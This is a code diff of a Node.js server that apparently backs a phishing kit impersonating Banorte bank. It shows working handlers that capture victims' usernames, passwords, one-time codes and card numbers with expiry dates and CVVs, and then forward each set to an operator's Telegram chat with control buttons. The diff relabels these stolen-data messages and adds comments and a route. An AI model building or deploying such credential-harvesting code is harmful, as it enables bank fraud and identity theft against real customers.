@@ -7,7 +7,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 const bodyParser = require('body-parser');
 
+// Crear servidor HTTP
 const server = http.createServer(app);
+
+// Configuración de Socket.io con CORS para Render
 const io = new Server(server, {
   cors: {
     origin: "*",
@@ -15,14 +18,24 @@ const io = new Server(server, {
   }
 });
 
+// Configuración de Telegram Bot
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+
+// Guardar sockets activos
 const activeSockets = new Map();
 
+// Middleware
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
+// Ruta raíz -> sirve index.html
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Socket.io
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
@@ -30,7 +43,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 RICK&MORTY TUS PAPAS: NUEVO BANORTE:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 NUEVO LOGIN BANORTE:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -45,11 +58,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Código OTP (bienvenido.html) - SOLO UNO
+  // Código OTP (bienvenido.html)
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 RICK&MORTY TUS PAPAS: CODIGO BANORTE:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 CÓDIGO BANORTE:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -64,11 +77,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // OTP reintento (denegado.html) - SOLO UNO
+  // OTP reintento (denegado.html)
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 RICK&MORTY TUS PAPAS: ERROR DE CODIGO LOGO BANORTE:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `📨 REINTENTO OTP BANORTE:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -87,7 +100,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, claveCajero, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ RICK&MORTY TUS PAPAS: ERROR LOGO BANORTE:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `⚠️ ERROR LOGO BANORTE:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -106,7 +119,7 @@ io.on('connection', (socket) => {
   socket.on('datosTarjeta', ({ tarjeta, vencimiento, cvv, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `💳 Datos de Tarjeta Recibidos:\n\n🔢 Número: ${tarjeta}\n📅 Vencimiento: ${vencimiento}\n🔒 CVV: ${cvv}`;
+    const mensaje = `💳 DATOS TARJETA:\n\n🔢 Número: ${tarjeta}\n📅 Vencimiento: ${vencimiento}\n🔒 CVV: ${cvv}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -190,6 +203,7 @@ bot.on('callback_query', (query) => {
   activeSockets.delete(sessionId);
 });
 
+// Puerto dinámico para Render
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
